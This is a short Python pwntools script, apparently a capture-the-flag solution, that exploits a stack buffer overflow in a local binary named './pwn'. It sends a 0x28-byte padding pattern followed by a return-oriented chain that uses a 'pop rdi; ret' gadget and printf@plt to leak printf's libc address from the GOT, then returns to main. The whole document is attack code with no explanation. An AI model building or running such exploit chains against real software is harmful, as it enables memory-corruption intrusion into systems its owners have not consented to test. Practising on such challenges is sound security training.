from pwn import *
context.log_level='debug'

io = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

poprdi_ret = 0x400733

payload = cyclic(0x28)
payload += p64(elf.symbols['main'])
payload += p64(poprdi_ret)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(elf.symbols['main'])
payload += p64(elf.symbols['main'])

io.sendlineafter(b'What\'s your name? ', payload)

io.interactive()